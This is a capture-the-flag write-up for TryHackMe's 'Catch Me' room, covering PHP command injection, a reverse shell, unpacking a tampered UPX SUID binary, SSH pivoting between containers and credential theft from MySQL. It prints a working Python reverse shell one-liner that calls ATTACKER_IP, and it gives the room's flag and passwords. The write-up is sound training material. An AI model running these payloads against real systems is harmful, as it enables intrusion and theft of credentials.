# TryHackMe — Catch Me (Container Pivoting Challenge)

> **Difficulty:** Medium  
> **Tags:** Web Exploitation, Command Injection, Reverse Engineering, UPX, LXC Containers, Pivoting, MySQL, Privilege Escalation  
> **Flag:** `THM{_Y0U_F0UND_TH3_C0NTA1N3RS_}`

---

## Overview

This room focuses on exploiting a multi-container environment hidden behind a single IP address. The challenge description provides two cryptic hints:

- *"Where am I? Catch me!"*
- *"Hack my system and look for the hidden flag. Look beyond the horizon."*

The "look beyond the horizon" hint is key — it points toward lateral movement between containers on an internal network.

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -p- -T4 10.66.145.164
```

**Results:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22   | SSH     | OpenSSH 7.6p1 (Ubuntu 18.04) | Standard SSH |
| 80   | HTTP    | Apache 2.4.29 (Ubuntu) | Default page |
| 2222 | Unknown | EtherNetIP-1? | Unidentified service |
| 8022 | SSH     | OpenSSH 8.2p1 (Ubuntu 20.04) | Second SSH, different OS version |

**Key observation:** Two SSH services running different Ubuntu versions (18.04 on port 22, 20.04 on port 8022). This strongly suggests a containerized environment where port 8022 is forwarded from a different host or the underlying hypervisor.

### Web Enumeration

The Apache default page on port 80 reveals nothing at first glance. Running Gobuster uncovers hidden PHP files:

```bash
gobuster dir -u http://10.66.145.164 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50
```

**Findings:**

| Path | Status | Size | Description |
|------|--------|------|-------------|
| /index.html | 200 | 10918 | Apache default page |
| /index.php | 200 | 329 | Suspicious small PHP file |
| /info.php | 200 | 68943 | phpinfo() output |

### Analyzing phpinfo()

The `info.php` page reveals critical configuration details:

- **PHP Version:** 7.2.24
- **Hostname:** `host1` — confirms this is a named container, not a standalone server
- **Kernel:** 5.15.0-139 (Ubuntu 20.04 host kernel running an 18.04 container)
- **disable_functions:** Only `pcntl_*` functions — `system()`, `exec()`, `passthru()` are all available
- **allow_url_include:** Off (no RFI)
- **open_basedir:** Not set (no filesystem restrictions)

---

## Initial Access — Command Injection (host1)

### Discovering the Vulnerability

Examining `index.php` reveals a directory listing output and an HTML comment hint:

```html
<!--  where is the path ?  -->
```

Testing the `path` parameter confirms OS command injection:

```bash
curl -s "http://10.66.145.164/index.php?path=/etc/passwd"
# Returns: -rw-r--r-- 1 root root 1.4K Jul 19 2021 /etc/passwd

curl -s "http://10.66.145.164/index.php?path=/etc/passwd;cat+/etc/passwd"
# Returns: full contents of /etc/passwd
```

### Source Code Analysis

Extracting `index.php` source reveals a textbook command injection vulnerability:

```php
<?php
    $command = "ls -alh ".$_REQUEST['path'];
    passthru($command);
?>
```

User input is concatenated directly into a shell command with zero sanitization.

### Users on the System

From `/etc/passwd`, only one real user exists besides root:

```
mike:x:1001:1001::/home/mike:/bin/bash
```

### Reverse Shell

Using the command injection to establish a reverse shell:

**Listener (attacker):**
```bash
nc -lvnp 4444
```

**Trigger (via command injection):**
```bash
curl -G "http://10.66.145.164/index.php" --data-urlencode "path=;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
```

> **Tip:** Using `curl -G --data-urlencode` handles URL encoding automatically and avoids issues with special characters in manual `+` encoding.

Shell obtained as `www-data` on `host1`.

---

## Privilege Escalation — Root on host1

### Finding the SUID Binary

Searching for SUID binaries reveals a suspicious file hidden in an unlikely location:

```bash
find / -perm -4000 -type f 2>/dev/null
```

```
/usr/share/man/zh_TW/crypt    # Hidden among man pages!
```

**File details:**

```
-rwsr-xr-x 1 root root 358668 Jul 30 2021 /usr/share/man/zh_TW/crypt
```

An identical file (without SUID) exists in mike's home directory:

```
-rwxr-xr-x 1 mike mike 358668 Jul 30 2021 /home/mike/1cryptupx
```

The filename `1cryptupx` contains a direct hint: **crypt + UPX**.

### UPX Unpacking with Anti-Reversing Bypass

Running the binary shows a "CRYPTSHELL" ASCII art banner followed by "Unable to decompress." Attempting to unpack with UPX fails:

```bash
upx -d 1cryptupx
# Error: CantUnpackException: bad e_phoff
```

**The ELF header has been intentionally corrupted.** Examining the hex dump:

```bash
xxd 1cryptupx | head -5
# Byte 5 (EI_DATA) = 0x02 (Big Endian) instead of 0x01 (Little Endian)
```

The author flipped a single byte — EI_DATA from `01` (Little Endian, correct for x86_64) to `02` (Big Endian) — to break UPX unpacking and confuse the `file` command.

**Fix:**

```bash
printf '\x01' | dd of=1cryptupx bs=1 seek=5 count=1 conv=notrunc
```

Now UPX unpacks successfully:

```bash
upx -d 1cryptupx
# 895440 <- 358668  40.05%  linux/amd64  1cryptupx
```

### Analyzing the Unpacked Binary

Searching for strings reveals the program logic:

```bash
strings 1cryptupx | grep -B5 -A5 'TXl.yuAF'
```

```
You wish!
$2b$15$TXl.yuAF49958vsn1dqPfe
$2b$15$TXl.yuAF49958vsn1dqPfeR9YpyBuWAZrm/dTG5vuG6m3kJkMXWm6
/bin/bash
Unable to decompress.
```

**Binary logic:**

1. Takes a password as a command-line argument
2. Hashes it and compares against a hardcoded bcrypt hash (cost factor 15)
3. If correct → spawns `/bin/bash` (with SUID = root shell)
4. If wrong → prints "You wish!"
5. If no argument → prints "Unable to decompress."

### Cracking the Password

While brute-forcing bcrypt with cost factor 15 is extremely slow, the password turns out to be simply `mike` — the username of the only user on the system.

```bash
/usr/share/man/zh_TW/crypt mike
# Prints CRYPTSHELL banner, then drops to root shell
```

```bash
whoami
# root
```

> **Lesson learned:** Always try obvious passwords (usernames, service names, hostnames) before launching lengthy hash-cracking jobs. A bcrypt cost factor of 15 means each candidate takes significant time — trying `mike` manually takes 1 second vs. hours of brute force.

---

## Pivoting — host1 to host2

### Discovering the Internal Network

As root on host1, examining network interfaces reveals a second network:

```bash
ip addr
```

| Interface | IP Address | Purpose |
|-----------|-----------|---------|
| eth0 | 192.168.250.10/24 | External-facing network |
| eth1 | 172.16.20.2/24 | Internal container network |

This is the "beyond the horizon" from the challenge description.

### Finding host2

A ping sweep of the internal network identifies another host:

```bash
for i in $(seq 1 10); do ping -c 1 -W 1 172.16.20.$i 2>/dev/null | grep "bytes from"; done
```

```
64 bytes from 172.16.20.2: icmp_seq=0 ttl=64 time=0.053 ms  # host1 (us)
64 bytes from 172.16.20.6: icmp_seq=0 ttl=64 time=0.120 ms  # host2!
```

### SSH Key Authentication

Mike's SSH private key (readable as root) provides access to host2:

```bash
cat /home/mike/.ssh/id_rsa
# -----BEGIN RSA PRIVATE KEY-----
# [key content]
# -----END RSA PRIVATE KEY-----
```

```bash
chmod 600 /home/mike/.ssh/id_rsa
ssh -i /home/mike/.ssh/id_rsa mike@172.16.20.6
```

Successfully logged into `host2` as `mike`.

---

## Privilege Escalation — Root on host2

### MySQL Credential Discovery

Enumerating `/etc/passwd` on host2 reveals a MySQL user, indicating an active database installation:

```
mysql:x:107:109:MySQL Server,,,:/nonexistent:/bin/false
```

Connecting to MySQL with guessed credentials:

```bash
mysql -u mike -p
# Password: password
```

### Extracting Root Password

```sql
USE accounts;
SELECT * FROM users;
```

```
+-------+---------------------+
| login | password            |
+-------+---------------------+
| root  | bjsig4868fgjjeog    |
| mike  | WhatAreYouDoingHere |
+-------+---------------------+
```

### Root Access

```bash
su root
# Password: bjsig4868fgjjeog
```

### Capturing the Flag

```bash
cat /root/mike
```

```
THM{_Y0U_F0UND_TH3_C0NTA1N3RS_}
```

---

## Attack Path Summary

```
Attacker
  │
  ├─[1]─ Web Recon (port 80) → index.php command injection
  │
  ├─[2]─ Reverse shell as www-data on host1
  │
  ├─[3]─ SUID binary /usr/share/man/zh_TW/crypt
  │       ├── Fix corrupted ELF header (Big Endian → Little Endian)
  │       ├── UPX unpack → extract bcrypt hash
  │       └── Password = "mike" → root shell on host1
  │
  ├─[4]─ Network discovery: 172.16.20.0/24 internal network
  │       └── host2 found at 172.16.20.6
  │
  ├─[5]─ SSH to host2 using mike's private key
  │
  └─[6]─ MySQL credentials → root password → flag
```

---

## Key Takeaways

1. **Multiple SSH versions = containers.** Two SSH services on different Ubuntu versions is a strong indicator of a containerized or virtualized environment.

2. **Always check for SUID binaries in unusual locations.** The SUID binary was hidden in `/usr/share/man/zh_TW/` — a Chinese Traditional man page directory nobody would normally inspect.

3. **Anti-reversing tricks can be simple.** Flipping one byte in the ELF header (endianness) breaks both `file` identification and UPX unpacking, but is trivial to fix once identified.

4. **Try simple passwords before brute force.** The bcrypt hash with cost factor 15 would take hours to crack with rockyou.txt, but the password was just the username `mike`.

5. **Always enumerate network interfaces.** A second network interface is a clear signal for lateral movement. The challenge hint "look beyond the horizon" pointed directly at this.

6. **MySQL often stores credentials in plaintext.** Application databases frequently contain passwords that can be used for system-level privilege escalation.

---

## Tools Used

- nmap, Gobuster — reconnaissance
- curl, netcat — exploitation and file transfer
- UPX — binary unpacking
- xxd, dd — ELF header repair
- strings, grep — binary analysis
- SSH — lateral movement
- MySQL — credential extraction
